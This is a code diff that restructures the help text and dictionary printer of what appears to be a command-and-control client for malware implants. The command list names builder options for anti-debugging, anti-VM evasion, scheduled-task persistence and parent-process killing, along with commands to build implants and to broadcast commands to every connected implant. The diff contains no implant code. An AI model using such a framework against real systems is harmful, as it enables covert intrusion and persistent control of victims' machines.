@@ -1,3 +1,6 @@
+from typing import Dict, Optional, Tuple
+
+
 COMMANDS = {
     "help": "Show this help message and exit",
     "show": {
@@ -7,13 +10,13 @@ COMMANDS = {
     },
     "builder": {
         "set": {
-            "initial_sleep_seconds <seconds>": "Set the initial sleep time",
-            "schtask_persist <true|false>": "Set the schtask_persist option",
-            "use_antidebug <true|false>": "Set the use_antidebug option",
-            "kill_parent <true|false>": "Set the kill_parent option",
-            "use_antivm <true|false>": "Set the use_antivm option",
-            "scheduled_task_name <name>": "Set the scheduled task name",
-            "register_max_retries <number>": "Set the max number of retries for registering",
+            "initial_sleep_seconds": "<seconds>: Set the initial sleep time",
+            "schtask_persist": "<true|false>: Set the schtask_persist option",
+            "use_antidebug": "<true|false>: Set the use_antidebug option",
+            "kill_parent": "<true|false>: Set the kill_parent option",
+            "use_antivm": "<true|false>: Set the use_antivm option",
+            "scheduled_task_name": "<name>: Set the scheduled task name",
+            "register_max_retries": "<number>: Set the max number of retries for registering",
         },
         "show": {
             "all": "Show all builder options",
@@ -26,14 +29,14 @@ COMMANDS = {
             "register_max_retries": "Show the max number of retries for registering",
         },
     },
-    "broadcast <command>": "Send an interact command to every connected implant (this can get very noisy, USE WITH CAUTION!)",
-    "build <output_file>": "Build an implant with the given options and write it to <output_file>",
-    "interact <implant_id>": "Interact with a given implant id",
-    "results <task_id> [local_path]": "Show the results of a given task id. Optionally write the results to a file",
+    "broadcast": "<command>: Send an interact command to every connected implant (this can get very noisy, USE WITH CAUTION!)",
+    "build": "<output_file>: Build an implant with the given options and write it to <output_file>",
+    "interact": "<implant_id>: Interact with a given implant id",
+    "results": "<task_id> [local_path]: Show the results of a given task id. Optionally write the results to a file",
     "alias": {
-        "set <implant_id> <alias>": "Set an alias for a given implant",
-        "list <implant_id>": "List all aliases for a given implant",
-        "delete <implant_id> <alias>": "Delete an alias for a given implant",
+        "set": "<implant_id> <alias>: Set an alias for a given implant",
+        "list": "<implant_id>: List all aliases for a given implant",
+        "delete": "<implant_id> <alias>: Delete an alias for a given implant",
     },
     "exit": "Exit the client",
 }
@@ -87,9 +90,14 @@ INTERACT_COMMANDS = {
 
 
 def walk_dict(d, depth=0):
+    
     for k, v in sorted(d.items(), key=lambda x: x[0]):
         if isinstance(v, dict):
             print("  " * depth + ("- %s" % k))
             walk_dict(v, depth + 1)
         else:
-            print("  " * depth + "- %s: %s" % (k, v))
+            if depth == 0:
+                sep = ": "
+            else:
+                sep = " "
+            print("  " * depth + "- %s%s%s" % (k, sep, v))
